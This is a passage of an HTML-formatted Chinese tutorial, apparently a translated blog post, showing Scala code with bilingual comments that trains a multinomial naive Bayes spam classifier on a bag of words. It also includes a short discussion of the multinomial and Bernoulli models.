&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-16&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//我们将它们组合在一起并将公共特征去除，因为它们是噪声&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-17&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hamFeatures&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamFeatures&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;toSet&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-18&quot;&gt;&lt;span class=&quot;crayon-i&quot;&gt;hamFeatures&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-19&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;intersect&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamFeatures&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-20&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-st&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-21&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-22&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Initialise a bag of words that takes the top x features &lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-23&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//from both spam and ham and combines them&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-24&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//初始化一个单词包，从垃圾特征集和正常特征集中取出最前的x个特征，将它们合并&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-25&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bag&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Bag&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-26&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Initialise the classifier array with first a set of 0(spam)&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-27&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//and then a set of 1(ham) values that represent the emails&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-28&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//将该分类器数组初始化，首先用一组数值0代替垃圾邮件，然后用一组数值1代替正常邮件&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-29&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifiers&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;   &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amountOfSamplesPerSet&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-30&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;                    &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;fill&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;Int&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;amountOfSamplesPerSet&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-31&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-32&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get the trainingData in the right format for the spam mails&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-33&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//取得正确格式的垃圾邮件训练数据&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-34&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;spamMails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-35&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bag&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;feature&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-36&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-37&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-38&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Get the trainingData in the right format for the ham mails&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-39&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//取得正确格式的正常邮件训练数据&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-40&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hamData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;hamMails&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-41&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bag&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;feature&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;_2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-s&quot;&gt;&quot; &quot;&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-42&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;toArray&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-43&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-44&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Combine the training data from both categories&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061350672727556-45&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//将两种训练数据合并&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061350672727556-46&quot;&gt;
&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;spamData&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;hamData&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0053 seconds] --&gt;
&lt;p&gt;给定了这个特征包以及一个训练数据集，我们就可以开始训练算法。为此，我们有几个模型可以采用：General 模型、Multinomial 模型和Bernoulli 模型。General 模型需要一个定义好的分布，而这个分布我们事先并不知道，因此这个模型并不是个好的选择。Multinomial 和Bernoulli 两个模型之间的区别就是它们对单词出现率的处理方式不同。Bernoulli模型仅仅是验证一个特征是否存在（二元值 1 或 0），因此它忽略了出现率这个统计值。反之，Multinomial 模型结合了出现率（由数值表示）。所以，与 Multinomial 模型比较，Bernoulli 模型在长文档中的表现较差。既然我们要对邮件排序，并且也要使用到出现率，因此我们主要讨论 Multinomial 模型，但尽管试试 Bernoulli 模型。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061355071202071&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
//Create the bayes model as a multinomial with 2 classification
// groups and the amount of features passed in the constructor.
//建立一个多项式形式的贝叶斯模型，将类别数2以及特征总数传递给该构建函数
  var bayes = new NaiveBayes(NaiveBayes.Model.MULTINOMIAL, 2, data.size)
  //Now train the bayes instance with the training data,
  // which is represented in a specific format due to the 
  //bag.feature method, and the known classifiers.
  //现在可以用训练数据和已知的分类器对贝叶斯模型进行训练，
  //训练数据已经用bag.feature方法表示为特定的格式

  bayes.learn(trainingData, classifiers)&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061355071202071-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061355071202071-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061355071202071-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061355071202071-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061355071202071-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061355071202071-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061355071202071-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061355071202071-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061355071202071-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d061355071202071-10&quot;&gt;10&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d061355071202071-11&quot;&gt;11&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061355071202071-1&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Create the bayes model as a multinomial with 2 classification&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061355071202071-2&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;// groups and the amount of features passed in the constructor.&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061355071202071-3&quot;&gt;&lt;span class=&quot;crayon-c&quot;&gt;//建立一个多项式形式的贝叶斯模型，将类别数2以及特征总数传递给该构建函数&lt;/span&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061355071202071-4&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-t&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bayes&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-r&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;NaiveBayes&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;NaiveBayes&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;Model&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;MULTINOMIAL&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061355071202071-5&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//Now train the bayes instance with the training data,&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061355071202071-6&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;// which is represented in a specific format due to the &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061355071202071-7&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//bag.feature method, and the known classifiers.&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061355071202071-8&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//现在可以用训练数据和已知的分类器对贝叶斯模型进行训练，&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061355071202071-9&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-c&quot;&gt;//训练数据已经用bag.feature方法表示为特定的格式&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587b19d061355071202071-10&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587b19d061355071202071-11&quot;&gt;
&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;bayes&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;learn&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;trainingData&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;classifiers&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0014 seconds] --&gt;
&lt;p&gt;现在我们有了一个训练好的模型，可以再次进行验证环节。不过呢，在案例数据中，我们已经将简单的和复杂的垃圾邮件（正常邮件）分开来，因此我们就不使用交叉验证了，而是用这些测试集来验证模型。以垃圾邮件分类作为开始，为此，我们使用 spam2 文件夹中的 1397 封垃圾邮件。&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d061359600913915&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
